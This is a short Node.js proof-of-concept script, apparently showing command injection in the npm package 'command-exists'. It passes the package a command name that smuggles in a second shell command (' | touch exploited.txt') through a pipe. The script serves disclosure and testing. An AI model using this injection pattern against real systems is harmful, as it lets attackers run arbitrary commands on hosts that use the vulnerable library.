const pkg = require('command-exists');

const payload = " | touch exploited.txt";

console.log(pkg);

const commandName = payload;

pkg(commandName);